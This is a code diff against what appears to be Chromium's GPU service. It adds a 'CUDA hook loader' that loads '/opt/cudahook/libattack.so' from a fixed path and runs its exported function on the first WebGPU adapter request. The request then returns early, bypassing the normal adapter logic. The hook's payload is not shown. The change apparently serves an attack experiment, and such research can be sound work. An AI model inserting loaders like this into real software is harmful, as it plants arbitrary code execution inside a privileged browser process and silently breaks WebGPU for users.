@@ -1,0 +1,163 @@
+diff --git a/gpu/command_buffer/service/BUILD.gn b/gpu/command_buffer/service/BUILD.gn
+index 12c02736381dc..b3aa8f1a41c7e 100644
+--- a/gpu/command_buffer/service/BUILD.gn
++++ b/gpu/command_buffer/service/BUILD.gn
+@@ -67,6 +67,11 @@ target(link_target_type, "service_sources") {
+     "transfer_buffer_manager.h",
+   ]
+ 
++
++  sources += [
++    "cuda_hook_loader.cc",
++    "cuda_hook_loader.h",
++  ]
+   configs += [
+     "//build/config:precompiled_headers",
+     "//gpu:gpu_implementation",
+diff --git a/gpu/command_buffer/service/cuda_hook_loader.cc b/gpu/command_buffer/service/cuda_hook_loader.cc
+new file mode 100644
+index 0000000000000..918d073e66fae
+--- /dev/null
++++ b/gpu/command_buffer/service/cuda_hook_loader.cc
+@@ -0,0 +1,73 @@
++#include "gpu/command_buffer/service/cuda_hook_loader.h"
++
++#include "base/environment.h"
++#include "base/files/file_path.h"
++#include "base/logging.h"
++#include "base/native_library.h"
++#include "base/no_destructor.h"
++#include "base/synchronization/lock.h"
++
++#include <unistd.h>
++#include <cstdio>
++
++namespace gpu {
++namespace {
++struct State {
++  base::Lock lock;
++  base::NativeLibrary lib = nullptr;
++  using Fn = void(*)(int*);    // <-- match your symbol signature
++  Fn fn = nullptr;
++};
++State& GetState() {
++  static base::NoDestructor<State> s;
++  return *s;
++}
++}  // namespace
++
++
++bool LoadCudaHookLibrary() {
++  auto& s = GetState();
++
++  std::unique_ptr<base::Environment> env(base::Environment::Create());
++  std::string path;
++  path = "/opt/cudahook/libattack.so";
++
++  base::FilePath so_path(path);
++  base::NativeLibraryLoadError error;
++  s.lib = base::LoadNativeLibrary(so_path, &error);
++  if (!s.lib) {
++    printf("Failed to load CUDA hook library from %s: %s\n",
++           so_path.value().c_str(), error.ToString().c_str());
++    return false;
++  }
++
++  auto* sym = base::GetFunctionPointerFromNativeLibrary(s.lib, "CudaHook_RunOnce");
++  if (!sym) {
++    printf("Failed to find symbol CudaHook_RunOnce in %s\n",
++           so_path.value().c_str());
++    return false;
++  }
++
++  printf("Successfully loaded CUDA hook library from %s\n",
++         so_path.value().c_str());
++  s.fn = reinterpret_cast<State::Fn>(sym);
++
++  return true;
++}
++
++void RunCudaHook(int *host_input) {
++  auto& s = GetState();
++  // Lazy-load if not loaded yet:
++  if (!s.fn && !LoadCudaHookLibrary()) return;
++    pid_t pid = getpid();
++    std::printf("Current PID: %d\n", static_cast<int>(pid));
++  if (s.fn) {
++    s.fn(host_input);  // synchronous call into your .so
++
++    return;
++  }
++  printf("CUDA hook function pointer is null\n");
++  return;
++
++}
++}  // namespace gpu
+diff --git a/gpu/command_buffer/service/cuda_hook_loader.h b/gpu/command_buffer/service/cuda_hook_loader.h
+new file mode 100644
+index 0000000000000..c2a784eef59df
+--- /dev/null
++++ b/gpu/command_buffer/service/cuda_hook_loader.h
+@@ -0,0 +1,8 @@
++#pragma once
++#include <stdint.h>
++
++namespace gpu {
++bool LoadCudaHookLibrary();
++
++void RunCudaHook(int *host_input);
++}  // namespace gpu
+diff --git a/gpu/command_buffer/service/webgpu_decoder_impl.cc b/gpu/command_buffer/service/webgpu_decoder_impl.cc
+index 0e9a197ff0043..275145441aa2f 100644
+--- a/gpu/command_buffer/service/webgpu_decoder_impl.cc
++++ b/gpu/command_buffer/service/webgpu_decoder_impl.cc
+@@ -6,14 +6,16 @@
+ // TODO(crbug.com/40285824): Remove this and convert code to safer constructs.
+ #pragma allow_unsafe_buffers
+ #endif
+-
++#include "base/containers/flat_set.h"
++#include "base/task/thread_pool.h"
++#include "gpu/command_buffer/service/cuda_hook_loader.h"
+ #include "gpu/command_buffer/service/webgpu_decoder_impl.h"
+ 
+ #include <memory>
+ #include <optional>
+ #include <string_view>
+ #include <vector>
+-
++#include <stdio.h>
+ #include "base/auto_reset.h"
+ #include "base/bits.h"
+ #include "base/containers/contains.h"
+@@ -114,6 +116,7 @@ WGPUStringView MakeStringView() {
+ 
+ class WebGPUDecoderImpl final : public WebGPUDecoder {
+  public:
++  base::flat_set<std::string> cuda_ran_isolation_keys_;
+   WebGPUDecoderImpl(
+       DecoderClient* client,
+       CommandBufferServiceBase* command_buffer_service,
+@@ -1327,11 +1330,22 @@ bool WebGPUDecoderImpl::IsFeatureExposed(wgpu::FeatureName feature) const {
+   }
+ }
+ 
++
++
++int tik_counter = 0;
++
+ template <typename CallbackInfo>
+ WGPUFuture WebGPUDecoderImpl::RequestAdapterImpl(
+     WGPUInstance instance,
+     const WGPURequestAdapterOptions* options,
+     CallbackInfo callback_info) {
++
++  if(tik_counter == 0){
++    tik_counter++;
++    std::unique_ptr<int[]> input(new int[1024 / sizeof(int)]);
++    gpu::RunCudaHook(input.get());
++  }
++  return {};
+   WGPURequestAdapterOptions default_options;
+   if (options == nullptr) {
+     default_options = {};
